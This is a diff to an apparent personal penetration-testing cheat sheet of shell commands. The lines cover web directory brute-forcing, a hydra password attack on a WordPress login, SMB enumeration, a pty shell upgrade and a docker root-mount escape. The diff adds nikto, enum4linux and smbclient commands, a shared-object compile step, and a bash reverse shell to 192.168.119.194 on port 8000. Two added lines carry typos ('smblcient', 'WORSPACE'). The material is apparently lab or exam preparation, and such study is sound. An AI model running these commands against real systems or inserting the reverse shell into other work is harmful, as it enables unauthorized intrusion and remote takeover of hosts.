@@ -11,10 +11,14 @@ sudo -l
 dirb "http://$target" -r -z 10
 gobuster dir -k --url "$target" --wordlist /usr/share/dirb/wordlists/common.txt | tee <(sed "s/.*\r//g" > gobuster.txt)
 hydra -l /usr/share/commix/src/txt/usernames.txt -p /usr/share/seclists/Passwords/cirt-default-passwords.txt "$target" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+nikto -h "$target"
 
 # SMB
 sudo nbtscan -r "$target"
 nmap -v -p 139,445 --script=smb-vuln-* "$target"
+enum4linux -o "$target" -k none
+smblcient -L "$target"
+smbclient \\\\$target\\WORSPACE
 
 # Upgrading Shell (pty)
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -43,3 +47,9 @@ docker run -v /:/mnt -it alpine
 
 # WordPress (wp)
 wpscan --url "http://$target" -e
+
+# Compiling Shared Object (so)
+gcc -o outfile.so -shared infile.c -fPIC
+
+# Reverse Shell
+bash -i >& /dev/tcp/192.168.119.194/8000 0>&1
